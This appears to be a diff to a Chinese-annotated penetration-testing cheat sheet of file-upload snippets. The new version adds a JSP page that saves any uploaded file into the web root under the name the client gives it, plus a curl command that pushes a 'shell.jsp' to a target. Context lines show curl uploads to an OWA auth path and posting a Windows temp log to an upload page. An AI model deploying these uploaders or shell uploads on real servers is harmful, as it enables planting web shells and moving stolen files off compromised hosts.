@@ -333,8 +333,13 @@ curl -k  -F "myfile=@t.txt" "http://127.0.0.1/owa/auth/3.aspx"   //-K 忽略证�
 curl -X POST -F "file=@c:/windows/temp/vm.log" http://192.168.1.3/up.aspx
 
 jsp 版本1
-<%@ page import="java.io.*"%><% request.getPart("file").write(getServletContext().getRealPath("/") + "uploadDemo.jsp"); %>
-curl -X POST -F "file=@/path/to/your/file" http://your_server_address/your_upload_page.jsp
+<%@ page import="java.io.*, javax.servlet.http.Part" %>
+<%
+Part filePart = request.getPart("file");
+String fileName = filePart.getSubmittedFileName();
+filePart.write(getServletContext().getRealPath("/") + fileName);
+%>
+curl -F "file=@/tmp/shell.jsp" http://192.168.1.2/upload.jsp
 
 jsp版本2
 <%@ page import="org.apache.commons.fileupload.*, org.apache.commons.fileupload.disk.*, org.apache.commons.fileupload.servlet.*, java.util.*, java.io.*" %>
